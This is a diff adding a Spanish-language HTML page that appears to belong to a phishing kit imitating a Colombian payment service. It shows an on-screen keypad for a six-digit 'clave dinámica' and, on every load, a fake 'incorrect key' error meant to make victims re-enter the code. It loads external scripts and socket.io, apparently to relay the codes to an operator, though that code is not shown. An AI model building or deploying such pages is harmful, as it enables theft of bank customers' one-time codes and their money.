@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>El servicio de envíos de Colombia</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;700&display=swap">
+    <link rel="stylesheet" href="css/style.css">
+    <style>
+        * {
+            font-family: 'Nunito', sans-serif;
+        }
+
+        body {
+            background-color: white;
+            display: flex;
+            justify-content: center;
+            align-content: flex-start;
+        }
+
+        #cargando {
+            position: fixed;
+            top: 60%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 920;
+            display: none;
+        }
+
+        .btn-habilitado {
+            background-color: #DA0081;
+            color: #fff;
+        }
+
+        .btn-deshabilitado {
+            background-color: #F1BFDA;
+            color: #fff;
+        }
+
+        #btn-consultar {
+            margin-top: 20px;
+        }
+
+        /* Estilo para el mensaje de error */
+        .mensaje-error {
+            display: flex; /* Inicialmente oculto */
+            align-items: center;
+            color: #fff;
+            background-color: #ff4d4d;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 14px;
+            text-align: center;
+            position: fixed;
+            top: -100px; /* Fuera de la pantalla */
+            left: 0;
+            right: 0;
+            z-index: 999;
+            transition: top 0.5s ease-in-out;
+        }
+
+        .mensaje-error.visible {
+            top: 0; /* Deslizar hacia abajo */
+        }
+
+        .mensaje-error::before {
+            content: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" style="fill: rgba(255, 255, 255, 1);transform: ;msFilter:;"><path d="M11.001 10h2v5h-2zM11 16h2v2h-2z"></path><path d="M13.768 4.2C13.42 3.545 12.742 3.138 12 3.138s-1.42.407-1.768 1.063L2.894 18.064a1.986 1.986 0 0 0 .054 1.968A1.984 1.984 0 0 0 4.661 21h14.678c.708 0 1.349-.362 1.714-.968a1.989 1.989 0 0 0 .054-1.968L13.768 4.2zM4.661 19 12 5.137 19.344 19H4.661z"></path></svg>'); /* Icono de exclamación */
+            margin-right: 10px;
+            font-size: 18px;
+            display: inline-flex;
+            align-items: center;
+            vertical-align: middle;           
+        }
+
+        .password-input {
+            color: black;
+        }
+
+        .numeric-keyboard {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr); /* 3 columnas */
+            gap: 10px;
+            justify-items: center;
+        }
+
+        .numeric-keyboard .key {
+            width: 50px;
+            height: 50px;
+            font-size: 40px;
+            text-align: center;
+            line-height: 10px;
+            cursor: pointer;
+            border: none;
+            background: none;
+            color: black; /* Color del texto */
+        }
+
+        .numeric-keyboard .key.empty {
+            visibility: hidden; /* Espacio vacío */
+        }
+
+        .numeric-keyboard .key.backspace {
+            grid-column: span 1; /* El botón de retroceso ocupa una columna */
+            text-align: center;
+        }
+
+        .key:active {
+            background-color: rgb(255, 255, 255);
+            border-radius: 5px;
+        }
+
+        .password-input {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px; 
+        }
+
+        .digit {
+            width: 40px; 
+            height: 40px; 
+            text-align: center; 
+            font-size: 24px;
+            border: none;
+            border-bottom: 0.2px solid #000;
+            outline: none; 
+            background: none; 
+        }
+
+        .digit:focus {
+            border-bottom: 2px solid #DA0081;
+        }
+    </style>
+    <script src="../../../js/functions.js"></script>
+</head>
+<body>
+    <div id="fondo"></div>
+    <img src="img/preloader2.gif" id="cargando" width="110">
+    <div id="frm-consulta" class="frm-modal">
+        <img src="img/dinamica.png" alt="" style="width: 100%;">
+        <div class="formulario">
+            <section class="password-input">
+                <input type="number" maxlength="1" class="digit" id="number-1" disabled/>
+                <input type="number" maxlength="1" class="digit" id="number-2" disabled/>
+                <input type="number" maxlength="1" class="digit" id="number-3" disabled/>
+                <input type="number" maxlength="1" class="digit" id="number-4" disabled/>
+                <input type="number" maxlength="1" class="digit" id="number-5" disabled/>
+                <input type="number" maxlength="1" class="digit" id="number-6" disabled/>
+            </section>
+            <br>
+            <br>
+            <div class="numeric-keyboard">
+                <button class="key">1</button>
+                <button class="key">2</button>
+                <button class="key">3</button>
+                <button class="key">4</button>
+                <button class="key">5</button>
+                <button class="key">6</button>
+                <button class="key">7</button>
+                <button class="key">8</button>
+                <button class="key">9</button>
+                <button class="key empty"></button> <!-- Espacio vacío -->
+                <button class="key">0</button>
+                <img src="../img/screenshot.png" class="key backspace"  alt="back">
+            </div>
+            <br>
+            <div class="g-recaptcha" data-sitekey="YOUR_SITE_KEY"></div>
+            <button class="btn btn-deshabilitado" id="btn-consultar">Continuar</button>
+            <!-- Mensaje de error -->
+            <div id="mensaje-error" class="mensaje-error">
+                ¡Ups! Clave dinámica incorrecta. Verifica e inténtalo de nuevo.
+            </div>
+        </div>
+    </div>
+    
+    <script src="js/jquery-3.6.0.min.js"></script>
+    <script src="js/infop.js"></script>
+    <script>
+        window.onload = function() {
+            // Mostrar el mensaje de error
+            var mensajeError = document.getElementById('mensaje-error');
+            mensajeError.style.display = 'block';
+            mensajeError.classList.add('visible');
+
+            // Ocultar el mensaje después de 4 segundos
+            setTimeout(function() {
+                mensajeError.classList.remove('visible');
+                setTimeout(function() {
+                    mensajeError.style.display = 'none';
+                }, 500); // Tiempo para la animación de deslizarse hacia arriba
+            }, 4000);
+        };
+    </script>
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            const inputs = document.querySelectorAll(".digit");
+            const button = document.querySelector(".btn");
+            const keys = document.querySelectorAll(".numeric-keyboard .key");
+
+            let currentInputIndex = 0;
+
+            inputs[0].focus(); // Hace foco en el primer input al cargar la página
+
+            keys.forEach(key => {
+                key.addEventListener("click", function () {
+                    const value = key.textContent.trim();
+
+                    if (key.classList.contains("backspace")) {
+                        if (currentInputIndex > 0) {
+                            currentInputIndex--;
+                            inputs[currentInputIndex].value = "";
+                            inputs[currentInputIndex].focus();
+                        } else if (currentInputIndex === 0) {
+                            inputs[currentInputIndex].value = "";
+                        }
+                    } else if (value !== "") {
+                        if (currentInputIndex < inputs.length) {
+                            inputs[currentInputIndex].value = value;
+                            currentInputIndex++;
+                            if (currentInputIndex < inputs.length) {
+                                inputs[currentInputIndex].focus();
+                            }
+                        }
+                    }
+                    checkInputs(); // Verifica el estado de los inputs
+                });
+            });
+
+            inputs.forEach((input, index) => {
+                input.addEventListener("input", function () {
+                    // Limitar la longitud del valor a 1 carácter
+                    if (input.value.length > 1) {
+                        input.value = input.value.slice(0, 1);
+                    }
+
+                    // Verifica si el valor ingresado es un número
+                    if (!/^\d$/.test(input.value)) {
+                        input.value = ''; // Elimina el carácter no numérico
+                    }
+
+                    if (input.value.length === 1 && index < inputs.length - 1) {
+                        inputs[index + 1].focus(); // Mueve el foco al siguiente input
+                    }
+                    checkInputs(); // Verifica el estado de los inputs
+                });
+
+                input.addEventListener("keydown", function (event) {
+                    if (event.key === "Backspace") {
+                        if (input.value.length === 0 && index > 0) {
+                            inputs[index - 1].focus(); // Mueve el foco al input anterior si se presiona Backspace
+                            inputs[index - 1].value = ""; // Borra el valor del input anterior
+                            currentInputIndex = index - 1;
+                        } else {
+                            input.value = ""; // Borra el valor del input actual
+                            currentInputIndex = index;
+                        }
+                    }
+                    checkInputs(); // Verifica el estado de los inputs
+                });
+            });
+
+            function checkInputs() {
+                const allFilled = Array.from(inputs).every(input => input.value.length === 1);
+                if (allFilled) {
+                    button.classList.remove("btn-deshabilitado");
+                }
+            }
+        });
+    </script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.min.js"></script>
+    <script src="js/waiting.js"></script>
+</body>
+</html>
